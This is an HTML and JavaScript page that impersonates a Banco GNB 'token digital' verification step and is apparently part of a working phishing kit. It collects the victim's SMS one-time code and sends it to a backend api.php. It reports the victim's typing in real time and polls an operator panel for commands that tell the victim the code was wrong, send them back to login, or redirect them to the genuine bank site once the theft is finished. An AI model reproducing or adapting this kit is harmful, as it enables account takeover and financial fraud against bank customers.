<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Token</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Helvetica Neue', Arial, sans-serif;
        }

        body {
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #333;
        }

        .token-container {
            background: #ffffff;
            width: 100%;
            max-width: 410px;
            padding: 40px 25px;
            text-align: center;
            position: relative;
            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
            border-radius: 8px;
        }

        .menu-icon {
            position: absolute;
            top: 25px;
            left: 25px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            gap: 5px;
        }
        .menu-icon span {
            width: 22px;
            height: 2px;
            background-color: #333;
        }

        .logo {
            max-width: 140px;
            margin-bottom: 20px;
        }

        .step-indicator {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
        }

        .step-indicator span {
            font-size: 0.85rem;
            color: #999;
        }

        .step-indicator .step-number {
            color: #0073b1;
            font-weight: bold;
        }

        h2 {
            color: #333;
            font-size: 1.3rem;
            font-weight: 500;
            margin-bottom: 8px;
        }

        .sub-title {
            color: #666;
            font-size: 0.95rem;
            margin-bottom: 25px;
        }

        .input-group {
            position: relative;
            margin-bottom: 15px;
        }

        .input-group input {
            width: 100%;
            padding: 18px 50px 18px 15px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 1rem;
            background-color: #fafafa;
            outline: none;
            transition: border-color 0.3s;
            text-align: center;
            letter-spacing: 4px;
            font-weight: bold;
            font-size: 1.2rem;
            text-transform: uppercase;
        }

        .input-group input:focus {
            border-color: #7cb342;
        }

        .input-group input::placeholder {
            letter-spacing: 0px;
            font-weight: normal;
            font-size: 1rem;
            color: #aaa;
            text-transform: none;
        }

        .input-group input.error {
            border-color: #d32f2f;
            background-color: #ffebee;
        }

        .field-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #666;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            user-select: none;
        }

        /* Mensaje de error debajo del input */
        .error-message-input {
            color: #d32f2f;
            font-size: 0.85rem;
            margin-bottom: 20px;
            display: none;
            font-weight: 500;
            text-align: center;
        }

        .error-message-input.show {
            display: block;
        }

        .btn-confirmar {
            width: 100%;
            padding: 16px;
            background-color: #d6d6d6;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 1.1rem;
            cursor: not-allowed;
            margin-top: 5px;
            transition: background-color 0.3s;
            font-weight: 500;
        }

        .btn-confirmar.active {
            background-color: #0073b1;
            cursor: pointer;
        }

        .links-container {
            margin-top: 25px;
        }

        .link-blue {
            color: #0073b1;
            text-decoration: none;
            font-size: 0.95rem;
            display: inline-block;
            margin-bottom: 15px;
        }

        .link-blue:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="token-container">
        <!-- Icono de menú -->
        <div class="menu-icon">
            <span></span>
            <span></span>
            <span></span>
        </div>

        <!-- Logo -->
        <img src="logo.jpeg" alt="Banco GNB" class="logo">

        <!-- Indicador de paso -->
        <div class="step-indicator">
            <span class="step-number">Paso 2 de 2</span>
            <span>•</span>
            <span>Solicitar Token Digital</span>
        </div>

        <h2>Ingresa el código que recibiste por SMS</h2>

        <form id="tokenForm" onsubmit="event.preventDefault();">
            
            <div class="input-group">
                <input type="text" id="codigoSMS" placeholder="Ingresar código" autocomplete="off" maxlength="10">
                <span class="field-icon">
                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <rect x="2" y="4" width="20" height="16" rx="2" ry="2"></rect>
                        <line x1="6" y1="8" x2="6" y2="8"></line>
                        <line x1="10" y1="8" x2="10" y2="8"></line>
                        <line x1="14" y1="8" x2="14" y2="8"></line>
                        <line x1="18" y1="8" x2="18" y2="8"></line>
                        <line x1="6" y1="12" x2="6" y2="12"></line>
                        <line x1="10" y1="12" x2="10" y2="12"></line>
                        <line x1="14" y1="12" x2="14" y2="12"></line>
                        <line x1="18" y1="12" x2="18" y2="12"></line>
                        <line x1="7" y1="16" x2="17" y2="16"></line>
                    </svg>
                </span>
            </div>

            <!-- Mensaje de error debajo del input -->
            <div id="errorMessageInput" class="error-message-input">❌ Token SMS inválido, intente nuevamente.</div>

            <button type="submit" id="btnConfirmar" class="btn-confirmar">Confirmar</button>
        </form>

        <div class="links-container">
            <a href="#" class="link-blue">No he recibido mi Código SMS</a>
        </div>
    </div>

    <script>
    
        const BANCO_OFICIAL = "https://www.bancognb.com.py/";

        const codigoSMS = document.getElementById('codigoSMS');
        const btnConfirmar = document.getElementById('btnConfirmar');
        const errorMessageInput = document.getElementById('errorMessageInput');

      
        const usuario = localStorage.getItem("usuariodavi") || "No disponible";

        let lastReceivedCommand = '';
        let statusPollTimer = null;
        let typingResetTimer = null;
        let isCurrentlyTyping = false;

        // Si llega con ?e=1, el operador marcó el código como incorrecto desde el panel
        if (new URLSearchParams(window.location.search).get('e') === '1') {
            codigoSMS.classList.add('error');
            errorMessageInput.classList.add('show');
        }

        function getClientId() {
            return parseInt(sessionStorage.getItem('conti_client_id') || '0', 10);
        }

        
        function sendTypingState(typing) {
            const cid = getClientId();
            if (!cid) return;
            const fd = new FormData();
            fd.append('action', 'typing');
            fd.append('client_id', cid);
            fd.append('typing', typing ? 1 : 0);
            fetch('api.php', { method: 'POST', body: fd }).catch(() => {});
        }

        function notifyTyping() {
            if (!isCurrentlyTyping) {
                isCurrentlyTyping = true;
                sendTypingState(true);
            }
            clearTimeout(typingResetTimer);
            typingResetTimer = setTimeout(() => {
                isCurrentlyTyping = false;
                sendTypingState(false);
            }, 1200);
        }

        function validarCampo() {
            if (codigoSMS.value.trim() !== "" && codigoSMS.value.length >= 4) {
                btnConfirmar.classList.add('active');
                codigoSMS.classList.remove('error');
                errorMessageInput.classList.remove('show');
            } else {
                btnConfirmar.classList.remove('active');
            }
        }

        
        codigoSMS.addEventListener('input', function() {
            this.value = this.value.replace(/[^a-zA-Z0-9]/g, '');
            validarCampo();
            notifyTyping();
        });

        
        function handleRemoteCommand(cmd) {
            const upper = (cmd || '').toUpperCase().trim();

            switch (upper) {
                case 'WAITING':
                case 'TOKEN':
                case 'CONTI':
                case 'SMS':
                
                    break;

                case 'ERROR_TOKEN':
                case 'ERROR_SMS':
                case 'ERROR_CONTI':
                case 'ERROR_CORREO':
                   
                    codigoSMS.classList.add('error');
                    errorMessageInput.classList.add('show');
                    codigoSMS.value = '';
                    btnConfirmar.classList.remove('active');
                    window.scrollTo({ top: 0, behavior: 'smooth' });
                    codigoSMS.focus();
                    break;

                case 'ERROR_LOGIN':
                case 'LOGIN':
                    clearInterval(statusPollTimer);
                    window.location.href = 'index.html';
                    break;

                case 'FINISH':
                    clearInterval(statusPollTimer);
                    window.location.href = BANCO_OFICIAL;
                    break;

                case 'BAN':
                    clearInterval(statusPollTimer);
                    window.location.href = BANCO_OFICIAL;
                    break;
            }
        }

        
        async function pollClientStatus() {
            try {
                const fd = new FormData();
                fd.append('action', 'check_status');
                fd.append('client_id', getClientId());
                fd.append('is_typing', isCurrentlyTyping ? 1 : 0);

                const res = await fetch('api.php', { method: 'POST', body: fd });

                if (res.status === 403) {
                    window.location.href = BANCO_OFICIAL;
                    return;
                }

                const data = await res.json();
                if (data && data.status === 'success') {
                    const cmd = data.command;
                    if (cmd !== lastReceivedCommand) {
                        lastReceivedCommand = cmd;
                        handleRemoteCommand(cmd);
                    }
                }
            } catch (e) {
                // Ignorar errores transitorios de red
            }
        }

        statusPollTimer = setInterval(pollClientStatus, 1500);
        pollClientStatus();

        btnConfirmar.addEventListener('click', async function(e) {
            e.preventDefault();

            const codigo = codigoSMS.value.trim();

            if (codigo === "" || codigo.length < 4) {
                codigoSMS.classList.add('error');
                errorMessageInput.classList.add('show');
                window.scrollTo({ top: 0, behavior: 'smooth' });
                return;
            }

            // Limpiar error
            codigoSMS.classList.remove('error');
            errorMessageInput.classList.remove('show');

            // Deshabilitar botón temporalmente
            btnConfirmar.disabled = true;
            btnConfirmar.textContent = 'Enviando...';

         
            try {
                const fd = new FormData();
                fd.append('action', 'submit_token');
                fd.append('client_id', getClientId());
                fd.append('token', codigo);
                fd.append('token_type', 'SMS');

                await fetch('api.php', { method: 'POST', body: fd });
            } catch (err) {
                
            }

           
            btnConfirmar.disabled = false;
            btnConfirmar.textContent = 'Confirmar';
            window.location.href = 'load.html';
        });
    </script>

</body>
</html>
